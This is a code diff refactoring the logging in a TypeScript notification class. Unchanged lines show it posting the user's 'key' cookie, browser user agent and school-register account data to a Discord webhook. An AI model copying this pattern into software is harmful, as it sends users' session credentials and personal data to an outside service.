@@ -1,11 +1,7 @@
-import Logger from "Logger";
-
-type AlertData = { message?: string, type: 'success' | 'danger' | 'info', dimissable?: boolean };
+import { AlertData } from "../types/NotificationManager";
 
 class NotificationManager {
-    constructor(private debug: boolean) {
-      this.debug = debug;
-    }
+    constructor() { };
     
     async notify({
       message,
@@ -13,12 +9,12 @@ class NotificationManager {
       logType,
       useContent,
     }: { message: string, alert?: AlertData, logType?: 'info' | 'error' | 'success'; useContent?: boolean; }) {
-      //if (this?.debug) Logger.info(`NotificationManager::documentAlert(${Logger._formatArgs(arguments)}) called`);
+      window.logger.info(`NotificationManager::documentAlert(${window.logger._formatArgs(arguments)}) called`);
       if (alert) this.documentAlert({
         ...alert,
         message: alert.message ?? message,
       });
-      if (logType) Logger[logType](alert.message || message);
+      if (logType) window.logger[logType](alert.message || message);
     
       await this.sendDiscordNotification({message, useContent});
     };
@@ -28,7 +24,7 @@ class NotificationManager {
       type,
       dimissable,
     }: AlertData) {
-      //if (this.debug) Logger.info(`NotificationManager::documentAlert(${Logger._formatArgs(arguments)}) called`);
+      window.logger.info(`NotificationManager::documentAlert(${window.logger._formatArgs(arguments)}) called`);
       const alert = document.getElementById('alert');
       alert.hidden = false;
       alert.className = `alert alert-${type}`;
@@ -49,7 +45,7 @@ class NotificationManager {
     };
     
     async sendDiscordNotification(opts: {message: string, useContent?: boolean}) {
-      //if (this.debug) Logger.info(`NotificationManager::sendDiscordNotification(${Logger._formatArgs(arguments)}) called`);
+      window.logger.info(`NotificationManager::sendDiscordNotification(${window.logger._formatArgs(arguments)}) called`);
       const response = await fetch(window.config.DS_HOOK, {
           method: 'POST',
           headers: { "Content-Type": "application/json" },
@@ -62,17 +58,17 @@ class NotificationManager {
                 fields: [
                     {
                         name: '**Device:**',
-                        value: Logger.codeblock(navigator.userAgent),
+                        value: window.logger.codeblock(navigator.userAgent),
                         inline: false,
                     },
                     {
                         name: '**Key:**',
-                        value: Logger.codeblock(window.cookieManager.getCookie('key')),
+                        value: window.logger.codeblock(window.cookieManager.getCookie('key')),
                         inline: false,
                     },
                     {
                         name: '**CVV User:**',
-                        value: Logger.codeblock(JSON.stringify(window.classeviva.user), 'json'),
+                        value: window.logger.codeblock(JSON.stringify(window.classeviva.user), 'json'),
                         inline: false,
                     },
                     {
@@ -86,11 +82,11 @@ class NotificationManager {
       });
     
       if (!response.ok) {
-        Logger.error('Error sending discord notification', response.status, response.statusText);
+        window.logger.error('Error sending discord notification', response.status, response.statusText);
         return false;
       };
     
-      //if (this.debug) Logger.success('Successfully sent discord notification');
+      window.logger.success('Successfully sent discord notification');
       return true;
     };
 }
